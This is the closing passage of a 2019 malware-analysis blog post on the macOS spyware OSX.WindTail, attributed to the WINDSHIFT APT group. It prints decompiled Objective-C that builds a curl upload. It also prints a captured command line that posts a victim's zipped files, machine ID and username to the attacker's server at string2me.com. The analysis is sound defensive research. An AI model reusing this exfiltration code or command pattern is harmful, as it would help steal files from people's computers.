+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Objective-c" data-lang="Objective-c"><span style="color:#75715e">/* @class image */</span>
+-(<span style="color:#66d9ef">void</span>)<span style="color:#a6e22e">upload</span> {
+    ...
+    
+    r14 <span style="color:#f92672">=</span> [tofg alloc];
+    <span style="color:#66d9ef">if</span> (r12<span style="color:#f92672">-&gt;</span>m_State <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x1</span>) {
+        var_30 <span style="color:#f92672">=</span> [<span style="color:#e6db74">@&#34;vast=@&#34;</span> stringByAppendingString:r12<span style="color:#f92672">-&gt;</span>m_tempPath];
+        [<span style="color:#e6db74">@&#34;od=&#34;</span> stringByAppendingString:r12<span style="color:#f92672">-&gt;</span>m_ComputerName_UserName];
+        [<span style="color:#e6db74">@&#34;kl=&#34;</span> stringByAppendingString:r12<span style="color:#f92672">-&gt;</span>cont];
+        r8 <span style="color:#f92672">=</span> var_30;
+        rax <span style="color:#f92672">=</span> [NSArray arrayWithObjects:<span style="color:#e6db74">@&#34;/usr/bin/curl&#34;</span>];
+        rdx <span style="color:#f92672">=</span> r12;
+        rax <span style="color:#f92672">=</span> [r14 initWithController:rdx arguments:rax];
+    }
+    <span style="color:#66d9ef">else</span> {
+        rax <span style="color:#f92672">=</span> [NSArray arrayWithObjects:<span style="color:#e6db74">@&#34;/usr/bin/curl&#34;</span>];
+        rcx <span style="color:#f92672">=</span> rax;
+        rax <span style="color:#f92672">=</span> [r14 initWithController:rdx arguments:rcx];
+    }
+
+    [rax startProcess];
+    <span style="color:#66d9ef">return</span>;
+}</code></pre></div>
+
+<p>References to <code>curl</code> (<code>/usr/bin/curl</code>) in this method imply the malware is likely exfiltrating the files by (ab)using this built-in network utility.
+</p>
+
+<p>This can be confirmed via <a href="https://github.com/objective-see/ProcInfo">ProcInfo</a>, (which also reveals the network endpoint <code>string2me.com/qgHUDRZiYhOqQiN/kESklNvxsNZQcPl.php</code>):</p>
+
+<div style="border: 1px solid gray; padding: 20px; margin-top:10px; overflow-wrap: break-word; background-color:black; color:lime;">
+  <span class="n3rdFont">
+    <pre>
+# ./procInfo
+
+[ process start]
+pid: 1258
+path: /usr/bin/curl
+user: 501
+args: (
+    "/usr/bin/curl",
+    "-F",
+    "vast=@/tmp/StopTemplate.pdf.zip",
+    "-F",
+    "od=1601201920543863",
+    "-F",
+    "kl=users-mac.lan-user",
+    "string2me.com/qgHUDRZiYhOqQiN/kESklNvxsNZQcPl.php"
+)
+</pre>
+  </span>
+</div>
+
+<p>From <code>curl</code>&rsquo;s man page, we can see that the <code>-F</code> flag will post data, and when <code>@</code> is specified, <code>curl</code> will process the input as a file:
+<blockquote><p><code>-F, --form &lt;name=content&gt;</code>
+<br />
+<br />
+    (HTTP) This lets curl emulate a filled-in form in which a user has pressed the submit button. This causes curl to POST data using the Content-Type multipart/form-data according to RFC 2388. This enables uploading of binary  files  etc.  To force the &lsquo;content&rsquo; part to be a file, prefix the file name with an @ sign. To just get the content part from a file, prefix the file name with the symbol &lt;. The difference between @ and &lt; is then that @ makes a file get attached in the post as a file upload, while the &lt; makes a text field and just get the contents for that text field from a file.
+    <br />
+    <br />
+    Example: to send an image to a server, where &lsquo;profile&rsquo; is the name of the form-field to which portrait.jpg will be the input:
+    <code>curl -F profile=@portrait.jpg https://example.com/upload.cgi</code></p>
+</blockquote></p>
+
+<p>A <a href="https://www.wireshark.org">WireShark</a> capture illustrates the exfiltration attempt to <code>string2me.com</code>:
+<img src="../images/blog/blog_0x3D/curl.png"  width="" class="center" style="margin-top:10px">
+</p>
+
+<p>Hooray, we&rsquo;ve uncovered (and confirmed) that <code>OSX.WindTail</code>s ultimate goal is to persistently exfiltrate files (such as documents) to a remote server.
+Such a capability fits nicely into any offensive cyber-espionage operation, such as the one orchestrated by the <code>WINDSHIFT</code> APT group.</p>
+
+<div class="note"><p>Note:</p>
+
+<p>OSX.WindTail attempts to upload the files to string2me.com.</p>
+
+<p>However, this server currently returns a 403 (HTTP Forbidden). Thus, at this point in time, the exfiltration fails.</p>
+</div>
+
+<h3 id="conclusion">Conclusion</h3>
+
+<p>It&rsquo;s not everyday that the Mac capabilities of an APT or &ldquo;nation state&rdquo; are uncovered.
+However, <code>OSX.WindTail</code> (belonging to the <code>WINDSHIFT</code> APT group), provided an interesting case-study, of such a tool.</p>
+
+<p>In today&rsquo;s blog post, we dove into <code>OSX.WindTail</code>, detailing it&rsquo;s method of installation, self-delete logic, and file-extfiltration capabilities. (See <a href="blog_0x3B.html">part one</a> for details on the malware&rsquo;s exploitation/infection vector and persistence mechanism).</p>
+
+<p>Specifically, we showed how the malware&rsquo;s installs itself into the <code>~/Library/</code>, before enumerating and exfiltrating documents and database files.</p>
+
+<div class="note"><p>Love these blog posts &amp; tools?
+<br />
+You can support them via my <a href="https://www.patreon.com/bePatron?c=701171">Patreon</a> page!
+</p>
+</div>
+
+</section>
+
+    </div>
+    
+<nav role="footer">
+  <ul>
+    <li class="copyright">&copy; 2019 objective-see llc</li>
+    <li><a href="mailto:contact@objective-see.com" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#x2709;</span></a></li>
+    <li><a href="https://twitter.com/objective_see" class="menubutton icon"><span class="ss-social ss-icon">&#xF611;</span></a></li>
+    <li>
+          <a href="https://www.patreon.com/bePatron?u=4857001" class="menubutton icon donate" style="font-size: 18px; padding-top: 14px; overflow-y: visible;">support us!</a>
+    </li>
+  </ul>
+</nav>
+  </body>
+</html>
